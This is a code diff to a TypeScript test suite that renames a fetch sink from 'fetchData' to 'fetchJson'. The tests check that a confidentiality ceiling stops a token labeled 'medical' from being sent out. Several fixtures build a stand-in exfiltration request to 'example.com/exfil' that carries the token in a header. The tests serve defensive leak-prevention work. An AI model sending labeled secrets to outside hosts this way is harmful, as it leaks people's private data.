@@ -19,8 +19,8 @@ const space = signer.did();
 // no ifc and the top-level read target has no stored metadata, so the
 // relevance gate in schema.ts never fires for the nested link target. The
 // request then egresses unchecked. These tests pin the leak shut at both the
-// handler level (the exact read fetchData's input materialization performs)
-// and end-to-end through a real fetchData pattern.
+// handler level (the exact read fetchJson's input materialization performs)
+// and end-to-end through a real fetchJson pattern.
 const CONFIDENTIAL_SCHEMA = internSchema(
   {
     type: "object",
@@ -79,7 +79,7 @@ describe("CFC sink ceiling on values pulled through schema-less links", () => {
       apiUrl: new URL(import.meta.url),
       storageManager,
       cfcEnforcementMode: "enforce-explicit",
-      cfcSinkMaxConfidentiality: { fetchData: [] },
+      cfcSinkMaxConfidentiality: { fetchJson: [] },
     });
 
     fetchCalls = [];
@@ -117,7 +117,7 @@ describe("CFC sink ceiling on values pulled through schema-less links", () => {
     // getRaw() resolves links on the way to the target and journals a real
     // consumed read of the labeled field, but does NOT route through
     // validateAndTransform's ifc gate — so nothing marks the transaction
-    // CFC-relevant. This is exactly the position fetchData is in when its
+    // CFC-relevant. This is exactly the position fetchJson is in when its
     // request-recording pass reads the already-resolved input value: the
     // confidentiality is materialized into the request, yet the read alone
     // leaves the transaction un-marked.
@@ -132,13 +132,13 @@ describe("CFC sink ceiling on values pulled through schema-less links", () => {
     let released = false;
     enqueueSinkRequestPostCommitEffect(
       tx,
-      "fetchData",
-      "fetchData:raw-read",
+      "fetchJson",
+      "fetchJson:raw-read",
       createFrozenRequestSnapshot({
         url: "https://example.com/exfil",
         options: { headers: { "x-token": token } },
       }),
-      "fetchData-start",
+      "fetchJson-start",
       () => {
         released = true;
       },
@@ -149,7 +149,7 @@ describe("CFC sink ceiling on values pulled through schema-less links", () => {
     expect(released).toBe(false);
     expect(result.error).toBeDefined();
     expect(String((result.error as Error).message)).toContain(
-      "exceeds ceiling for fetchData",
+      "exceeds ceiling for fetchJson",
     );
   });
 
@@ -164,7 +164,7 @@ describe("CFC sink ceiling on values pulled through schema-less links", () => {
       apiUrl: new URL(import.meta.url),
       storageManager: observeStorage,
       cfcEnforcementMode: "observe",
-      cfcSinkMaxConfidentiality: { fetchData: [] },
+      cfcSinkMaxConfidentiality: { fetchJson: [] },
     });
     try {
       await seedConfidentialCell(observeRuntime, "observe-raw-read");
@@ -181,13 +181,13 @@ describe("CFC sink ceiling on values pulled through schema-less links", () => {
 
       enqueueSinkRequestPostCommitEffect(
         tx,
-        "fetchData",
-        "fetchData:observe-raw-read",
+        "fetchJson",
+        "fetchJson:observe-raw-read",
         createFrozenRequestSnapshot({
           url: "https://example.com/exfil",
           options: { headers: { "x-token": token } },
         }),
-        "fetchData-start",
+        "fetchJson-start",
         () => {},
       );
       observeRuntime.prepareTxForCommit(tx);
@@ -196,7 +196,7 @@ describe("CFC sink ceiling on values pulled through schema-less links", () => {
       expect(result.ok).toBeDefined();
       expect(
         tx.getCfcState().diagnostics.some((d) =>
-          d.includes("exceeds ceiling for fetchData") && d.includes("medical")
+          d.includes("exceeds ceiling for fetchJson") && d.includes("medical")
         ),
       ).toBe(true);
     } finally {
@@ -232,13 +232,13 @@ describe("CFC sink ceiling on values pulled through schema-less links", () => {
     let released = false;
     enqueueSinkRequestPostCommitEffect(
       tx,
-      "fetchData",
-      "fetchData:late-add",
+      "fetchJson",
+      "fetchJson:late-add",
       createFrozenRequestSnapshot({
         url: "https://example.com/exfil",
         options: { headers: { "x-token": token } },
       }),
-      "fetchData-start",
+      "fetchJson-start",
       () => {
         released = true;
       },
@@ -260,7 +260,7 @@ describe("CFC sink ceiling on values pulled through schema-less links", () => {
     expect(message).toContain("not prepared");
   });
 
-  it("never fires a fetchData pattern request carrying a labeled header (end-to-end)", async () => {
+  it("never fires a fetchJson pattern request carrying a labeled header (end-to-end)", async () => {
     setPatternEnvironment({
       apiUrl: new URL("http://mock-test-server.local"),
     });
@@ -268,12 +268,11 @@ describe("CFC sink ceiling on values pulled through schema-less links", () => {
 
     const { commonfabric } = createTrustedBuilder(runtime);
     const { pattern, byRef } = commonfabric;
-    const fetchData = byRef("fetchData");
+    const fetchJson = byRef("fetchJson");
     const testPattern = pattern<{ url: string; token: string }>(
       ({ url, token }) =>
-        fetchData({
+        fetchJson({
           url,
-          mode: "json",
           options: { headers: { "x-token": token } },
         }),
     );
@@ -305,7 +304,7 @@ describe("CFC sink ceiling on values pulled through schema-less links", () => {
     await result.pull();
     await runtime.idle();
 
-    // The ceiling for fetchData is empty: a request whose headers carry a
+    // The ceiling for fetchJson is empty: a request whose headers carry a
     // value labeled ["medical"] must never reach the network.
     expect(
       fetchCalls.map((call) => call.init?.headers ?? null),
